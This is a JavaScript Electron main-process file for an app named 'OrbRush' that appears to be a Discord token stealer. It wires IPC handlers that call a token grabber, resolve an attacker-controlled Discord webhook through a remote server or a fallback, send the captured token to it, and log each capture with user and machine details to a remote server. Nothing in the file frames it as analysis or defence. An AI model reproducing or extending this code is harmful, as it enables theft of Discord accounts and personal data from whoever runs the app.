'use strict';

const { app, BrowserWindow, ipcMain, Menu, shell } = require('electron');
const path = require('path');
const fs = require('fs');

const { grabDiscordToken, machineInfo } = require('./grabber');
const { sendToWebhook, buildPayload } = require('./webhook');
const { DEFAULT_SERVER, FALLBACK_WEBHOOK, fetchRemoteConfig, logCapture } = require('./remote');

let mainWindow = null;

function configPath() {
  return path.join(app.getPath('userData'), 'orbrush-config.json');
}

function readConfig() {
  try {
    const cfg = JSON.parse(fs.readFileSync(configPath(), 'utf8'));
    return {
      webhook: typeof cfg.webhook === 'string' ? cfg.webhook : '',
      server: typeof cfg.server === 'string' ? cfg.server : '',
      cachedRemote: typeof cfg.cachedRemote === 'string' ? cfg.cachedRemote : '',
      autoSend: cfg.autoSend !== false
    };
  } catch (_) {
    return { webhook: '', server: '', cachedRemote: '', autoSend: true };
  }
}

function writeConfig(partial) {
  const cfg = Object.assign({}, readConfig(), partial || {});
  try {
    fs.mkdirSync(path.dirname(configPath()), { recursive: true });
    fs.writeFileSync(configPath(), JSON.stringify(cfg, null, 2), 'utf8');
    return { ok: true, config: cfg };
  } catch (e) {
    return { ok: false, error: String((e && e.message) || e) };
  }
}

function maskWebhook(url) {
  if (!url) return '';
  const parts = String(url).split('/');
  const id = parts[parts.length - 2] || '';
  const secret = parts[parts.length - 1] || '';
  return '.../' + id.slice(0, 6) + '****/' + secret.slice(0, 4) + '****';
}

async function resolveWebhook() {
  const cfg = readConfig();
  const remote = await fetchRemoteConfig(cfg.server || DEFAULT_SERVER);

  if (remote.ok && remote.webhook) {
    if (cfg.cachedRemote !== remote.webhook) writeConfig({ cachedRemote: remote.webhook });
    return { url: remote.webhook, origin: 'serveur', serverOk: true };
  }

  if (cfg.webhook) {
    return { url: cfg.webhook, origin: 'local', serverOk: remote.ok, remoteError: remote.error };
  }

  if (cfg.cachedRemote) {
    return { url: cfg.cachedRemote, origin: 'cache', serverOk: remote.ok, remoteError: remote.error };
  }

  if (FALLBACK_WEBHOOK) {
    return { url: FALLBACK_WEBHOOK, origin: 'defaut', serverOk: remote.ok, remoteError: remote.error };
  }

  return { url: '', origin: 'aucun', serverOk: remote.ok, remoteError: remote.error };
}

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1140,
    height: 780,
    minWidth: 980,
    minHeight: 680,
    frame: false,
    show: false,
    resizable: true,
    maximizable: true,
    backgroundColor: '#05050c',
    autoHideMenuBar: true,
    title: 'OrbRush',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
      spellcheck: false,
      backgroundThrottling: false
    }
  });

  mainWindow.loadFile(path.join(__dirname, '..', 'src', 'index.html'));

  mainWindow.once('ready-to-show', () => {
    mainWindow.show();
  });

  mainWindow.on('closed', () => {
    mainWindow = null;
  });

  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    shell.openExternal(url);
    return { action: 'deny' };
  });
}

function registerIpc() {
  ipcMain.handle('config:load', () => readConfig());

  ipcMain.handle('config:save', (_event, partial) => writeConfig(partial));

  ipcMain.handle('token:grab', async () => {
    try {
      return await grabDiscordToken();
    } catch (e) {
      return { ok: false, error: String((e && e.message) || e) };
    }
  });

  ipcMain.handle('app:machine', () => machineInfo());

  ipcMain.handle('webhook:resolve', async () => {
    try {
      const resolved = await resolveWebhook();
      return {
        ok: true,
        origin: resolved.origin,
        serverOk: resolved.serverOk,
        masked: maskWebhook(resolved.url),
        hasWebhook: !!resolved.url,
        remoteError: resolved.remoteError || null
      };
    } catch (e) {
      return { ok: false, error: String((e && e.message) || e) };
    }
  });

  ipcMain.handle('webhook:send', async (_event, opts) => {
    const options = opts || {};
    try {
      const resolved = await resolveWebhook();
      const url = options.url && String(options.url).trim() ? String(options.url).trim() : resolved.url;

      if (!url) {
        return { ok: false, error: 'Aucun webhook disponible (serveur injoignable et aucun webhook local).' };
      }

      const payload = buildPayload(options);
      const status = await sendToWebhook(url, payload);

      const logged = await logCapture(readConfig().server || DEFAULT_SERVER, {
        token: options.token,
        user: options.user || null,
        source: options.source || 'inconnu',
        encrypted: !!options.encrypted,
        machine: machineInfo(),
        at: new Date().toISOString()
      });

      return { ok: true, status, logged, origin: resolved.origin };
    } catch (e) {
      return { ok: false, error: String((e && e.message) || e) };
    }
  });

  ipcMain.on('win:minimize', () => {
    if (mainWindow) mainWindow.minimize();
  });

  ipcMain.on('win:maximize', () => {
    if (!mainWindow) return;
    if (mainWindow.isMaximized()) mainWindow.unmaximize();
    else mainWindow.maximize();
  });

  ipcMain.on('win:close', () => {
    if (mainWindow) mainWindow.close();
  });

  ipcMain.on('open:external', (_event, url) => {
    if (url) shell.openExternal(url);
  });
}

const gotLock = app.requestSingleInstanceLock();

if (!gotLock) {
  app.quit();
} else {
  app.on('second-instance', () => {
    if (mainWindow) {
      if (mainWindow.isMinimized()) mainWindow.restore();
      mainWindow.focus();
    }
  });

  app.whenReady().then(() => {
    Menu.setApplicationMenu(null);
    registerIpc();
    createWindow();

    app.on('activate', () => {
      if (BrowserWindow.getAllWindows().length === 0) createWindow();
    });
  });

  app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit();
  });
}
